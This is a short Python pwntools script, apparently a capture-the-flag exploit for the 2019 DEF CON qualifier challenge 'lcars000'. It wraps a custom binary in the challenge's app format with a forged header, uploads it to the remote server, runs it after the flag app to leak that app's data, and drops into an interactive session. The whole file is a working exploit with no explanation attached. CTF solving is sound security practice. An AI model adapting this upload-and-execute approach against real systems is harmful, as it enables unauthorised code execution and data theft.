#!/usr/bin/env python
# coding: utf-8

from pwn import *
context.arch = 'amd64'

p = remote('lcars000.quals2019.oooverflow.io', 5000)

def pack_papp(code, app_name):
	header = p32(0x4C494645) + p32(1) + app_name.ljust(0x20, '\0')
	code_seg = p32(0x60000000) + p32(len(code)) + p8(0x5) + p8(0) + p8(0) + p8(0)

	return header + code_seg + code

data = pack_papp(open('test.bin','rb').read(), 'aaa1a')
p.recvuntil('\ninit')

p.sendline('download test.papp {}'.format(len(data)))
p.send(data)
p.sendline('run flag1.papp')
p.recvuntil('encrypted')
p.sendline('run test.papp')
p.recvuntil('here is your data:')
leak_data = p.recvuntil('EOFEOFEOF', drop=True)
print(leak_data)
p.interactive()
